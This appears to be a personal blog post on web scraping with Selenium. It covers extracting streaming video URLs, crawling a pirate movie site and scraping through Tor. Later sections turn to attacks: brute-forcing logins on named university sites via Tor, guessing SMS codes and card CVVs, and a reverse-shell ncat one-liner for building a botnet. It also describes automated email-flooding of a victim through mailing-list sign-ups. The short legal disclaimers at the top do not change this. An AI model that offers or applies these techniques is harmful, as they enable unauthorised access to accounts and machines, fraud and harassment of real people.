---
title: "The Gray Zone: Web Scraping, Security, and Ethical Considerations"
date: Sat Aug 12 2023 01:40:12
type: web
_oid: "64d7454caf6cb557ba54c66b"
---
## **Legality & Ethical Concerns**: {#legality--ethical-concerns}

-   **YouTube Content**: Scraping videos from YouTube is against their
    Terms of Service. Consider the legal and ethical implications of
    such actions.
-   **Brute-forcing**: Even if the target lacks advanced defenses,
    unauthorized access attempts are illegal and ethically questionable
    in many jurisdictions.
-   **Tor & Illegal Activities**: Using Tor doesn\'t make illegal
    activities permissible. Remember, actions can still be prosecuted if
    detected.
-   **Reverse Shells & Botnets**: Unauthorized access or creating
    botnets are serious crimes.
-   **Email Flooding**: This is invasive and can be perceived as
    harassment.

## Why?

I am obsessed with searching and browsing the Internet these days.
However, it is kind of tiresome to browse everything myself. So I
decided to try out scrapying information.

## Scraping Videos {#how}

When trying to scrape a website, the first thing to do is to inspect and
try to find the html around the important information. Go ctrl+shft+i
then ctrl+f to find the relevant information.

For example, youtube video uses have src field like

    <video tabindex="-1" class="video-stream html5-main-video" controlslist="nodownload" style="width: 725px; height: 544px; left: 0px; top: 0px;" src="blob:https://www.youtube.com/34b0564d-9f35-4581-bf5c-eed542280a0b"></video>

### Blob video

Blob obfuscates the source, preventing one from downloading the video.
However, the source is usually loaded in m3u8 file. An m3u8 file usually
consists of many segments of video files (they are combined together).

M3u8 file is sent from the network tab, so go there to find some files
(if the website uses other formats it is not valid).

There are a few chrome extensions to download the m3u8(or detect the
m3u8 file), [Fetchv](https://fetchv.net/), [Blob video
Downloader](https://chrome.google.com/webstore/detail/blob-video-downloader/knpbbcbpainepebaalgbehcidbkednfb).

When sharing, the youtube uses embed tags. So you can also find a video
with url like
<https://www.youtube.com/watch?v=LlIkyhttqOI&ab_channel=EtoGolos> in the
url <https://www.youtube.com/embed/LlIkyhttqOI>, except videos with
copyright.

### Network Sniffing to Get m3u8 {#network-sniffing}

I use network sniffing to get the m3u8 files by getting the performance,
then extracting all urls. Typically the video players all have an
iframe, where there is embeded video inside, then inside the iframe
there is a embed video, which source is blob url, and the m3u8 file will
be send over the network, which I can find the urls ending with m3u8.

    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    import json
    import time

    options = Options()
    options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

    driver = webdriver.Chrome(options=options)
    driver.get("https://www.instagram.com/p/CvKIrhaI_MO/")
    driver.implicitly_wait(10)
    time.sleep(5)
    logs = driver.get_log("performance")

    m3u8_urls=[]
    for entry in logs:
        log_data = json.loads(entry["message"])["message"]
        if log_data["method"] == "Network.requestWillBeSent":
            urlfind=log_data["params"]["request"]["url"]
            # print(urlfind)
            if urlfind.endswith(".m3u8") or (".mp4" in urlfind): 
                m3u8_urls.append(urlfind)
    for url in m3u8_urls:
        print(f"Extracted URL: {url}")
    driver.quit()

This works with pretty much all except YouTube and Bilibili and Netflix,
which use DASH (Dynamic Adaptive Streaming over HTTP). It generates a
m4s file with short time to live. However, youtube downloaders are all
over the Internet, and there is a youtube-dl apt repo. Instagram videos
use mp4 file (which is strange). Twitch(I never used before) and some
adult sites use m3u8.

### Converting m3u8 to mp4

After getting the m3u8 file I need to convert to mp4 file. I can do this
by using either the Cvlc or FFmpeg. Open the vlc and start network
stream. I can also do this in command line

    cvlc "http://path.to/your/stream.m3u8" --sout "#std{access=file,mux=mp4,dst=/path/to/output/file.mp4}" vlc://quit

Downloading video is pretty much useless for me since I can watch
(almost) any videos myself with vpn and google search, which typically
takes like 10 seconds. Some premium videos cost few money these days.
However, it is only useful, say, when you download the premium
subscription video on a separate server and sell it(or put it online
with ads), which is illegal and dangerous.

### Crawling 123movies

I used selenium, a python library.

Code to find movie src iframe in the movie page. I first find the button
to click to play, then I look for the iframe and get the src.

    python_button = driver.find_element(By.ID ,"play-now")
    python_button.click()

    sourceiframe = driver.find_element(By.ID ,"playit") 
    time.sleep(3)
    return sourceiframe.get_attribute("src")

Then crawl the movie list page to find all movie htmls to send into this
code snippet above. The url begin with
\"<https://ww9.0123movie.net/movie>\", so I find these in the page and
then get the whole url.

Then I write the moviename and link in a file

### Other Websites

I haven\'t find any motivation to crawl other websites because\
1 I don\'t think it\'s necessary since I can find the thing I want in
like 10 seconds and\
2 it is kind of illegal

### смотрим

[смотрим](https://smotrim.ru) is a wonderful streaming website,
containing free movies, tv show, news streaming, and music, etc. [Россия
1](https://player.smotrim.ru/iframe/live/id/63250/showZoomBtn/false/isPlay/true/mute/true/sid/smotrim_r1/)
is the most popular tv channel, and it sends m3u8 files live(each is
like 15 seconds).

There are also TV shows like [Грозный](https://smotrim.ru/brand/64994),
or [embeded
player](https://player.smotrim.ru/iframe/video/id/2243454/sid/smotrim/isPlay/true/mute/true/),
and [m3u8
file](https://cdn-v.rtr-vesti.ru/_cdn_auth/secure/v/vh/vod_hls/definst/smil:vh/smil/002/353/344_d20201122184744.smil/chunklist_b4050000_pd2854000.m3u8)

The point is those movies and tv shows are all free and so there is no
point in downloading them or crawling anyways.

## Tor Crawling

It is a good idea to use tor crawling (both hiding the server\'s ip
address and avoid sending too much requests from a single ip)

First run sudo apt install tor, then sudo service start tor, then add
the following lines to python code

    options=Options()

    options.set_preference("network.proxy.type", 1)
    options.set_preference("network.proxy.socks", "127.0.0.1")
    options.set_preference("network.proxy.socks_port", 9050)
    options.set_preference("network.proxy.socks_version", 5)
    options.set_preference("network.proxy.socks_remote_dns", True)

    browser = Firefox(options=options)

We can then access to onion sites

    browser.get("http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/")

However, when crawling cloudflare sites there might be captcha.

### Opening Tor Browser

Since tor is based on firefox, I can open tor browser from code.

Find the location in terminal by

    find ~/ -name firefox -type f

then

    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options
    import time

    tor_path = r"/[location]/tor-browser/Browser/firefox"
    tor_profile="/[location]/tor-browser/Browser/TorBrowser/Data/Browser/profile.default"

    options = Options()
    options.profile=tor_profile
    options.binary_location = tor_path
    options.set_preference("network.proxy.type", 1)
    options.set_preference("network.proxy.socks", "127.0.0.1")
    options.set_preference("network.proxy.socks_port", 9150)
    options.set_preference("network.proxy.socks_remote_dns", True)

    driver = webdriver.Firefox(options=options)

    driver.get("http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/")

Since I am scraping and not actually browsing, it is useful to disable
images

    options.set_preference("permissions.default.image", 2)

## Brute-Forcing Passwords

Since I can mess up with the IP, I can make many attempts to brute-force
the password by sending many requests.

On some websites like [USTC login](https://jw.ustc.edu.cn), it is very
difficult because it requires a verification code and cannot be accessed
from tor browser.

On other login forms, for example like [USTC
Icourse](https://icourse.club/signin-3rdparty/?challenge=29qoq28e6nb0b8mctook&next_url=https%3A%2F%2Fpi-review.com%2Fapi%2Ficourse-login%2Fverify&from_app=PI+Review),
it is very easy to brute force because it doesn\'t require any
verification and can be accessed from tor. I can easily use the sendkeys
function and try submit, and use many threads together to submit
requests.

Google account need passwords with at least 8 characters, and not in
common passwords(I tried some of 10000 most common passwords and all
failed), so it is really hard to guess a gmail password.

For example, I can go to the login page of openai with

    try:
        loginbutton = driver.find_element(By.XPATH,"//*[contains(@class, 'btn-primary')]")
        loginbutton.click()
    except:
        loginbutton = driver.find_element(By.XPATH,"//*[contains(@class, 'bg-[#3C46FF]')]")
        loginbutton.click()

There are several applications (I think).

\
1 Brute-forcing passwords(2/10000 percent success)\
2 Log in with sms (1/100000 percent success with 6 digits, not too
hard)\
3 Getting a list of bank accounts then trying the cvv (1/1000-1/100000
percent success if know the number and postal code correctly)

However, they succeed with like 1 in 1 million probability. Moreover,
google login and mails like 163 logins all require captchas when
visiting with tor browser. Since security is economics, it is not a good
idea to execute such attacks on popular websites like gmail or instagram
or twitter. With that much legit web traffic, it is possible to ddos a
website.

## Reverse Shell

I can gain remote access to machine by using ncat. Gaining access to
remote servers construct a botnet.

On the victim\'s machine just execute

    nohup ncat [attacker's IP] [port] -e /bin/bash &

Then close the window.

On the attacker\'s machine listen on the corresponding port

After this I gain access to execute bash script.

Also, attacker can subscribe the victim email to mail lists so the
victim\'s inbox could be flooded with hundreds of emails.

Use automated scripts to sign up the victim\'s addresss with many forums
in a short time(with only email address and no confirmation).

Some email signups need captchas or confirmation, other doesn\'t and the
script can sign the victim up easily with web crawler, look at [(this
form I found
online)](https://www.hup.harvard.edu/news/mailing-list.html%5D) .

While this attack requires much time to find the website and signup for
the email address, I think it is feasible because it automates email
from other providers and basically floods the victim with thousands of
emails.

## Accessing the shell with python

Using the subprocess library, either with subprocess.run or
subprocess.Popen, I can access the shell easily and run commands. Use
the communicate function to run sudo commands like

    import subprocess

    password = ''
    cmd = 'sudo -S apt upgrade'  # -S allows password from stdin

    process = subprocess.Popen(
        cmd, 
        shell=True, 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    )

    # communicate sends the password to the process's stdin
    stdout, stderr = process.communicate(input=f'{password}\n'.encode())

    print(stdout.decode())

Also, I can use the paramiko library to access the remote server.

By accessing the shell with python I can then effectively control
multiple instances.

## Conclusion

Web crawling is fun and made me understand html better. I think the most
valuable thing to do is doing data analytics using web crawler. It is
easy to cross the line and go illegal crawling.

Scraping videos is pretty much useless because I can watch any video I
want in the first place, and distributing is dangerous and illegal.
Brute-forcing passwords is not cost effective.

## Acknowledgements {#last}

Also, I think ChatGpt is a great tool to use when writing code because
it answers questions accurately with code snippets that worked.
